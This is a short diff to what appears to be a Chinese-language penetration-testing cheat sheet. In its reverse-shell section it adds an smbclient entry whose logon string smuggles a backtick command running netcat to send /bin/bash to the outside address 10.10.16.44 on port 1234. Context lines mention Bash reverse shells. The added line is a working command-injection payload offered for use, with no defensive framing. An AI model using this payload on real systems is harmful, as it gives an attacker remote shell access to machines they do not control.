@@ -109,6 +109,12 @@ awk 'BEGIN {
 
 ### 反弹 shell
 
+#### smbclient
+
+```
+logon "./=`nohup nc 10.10.16.44 1234 -e /bin/bash`"
+```
+
 #### Bash 
 
 Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
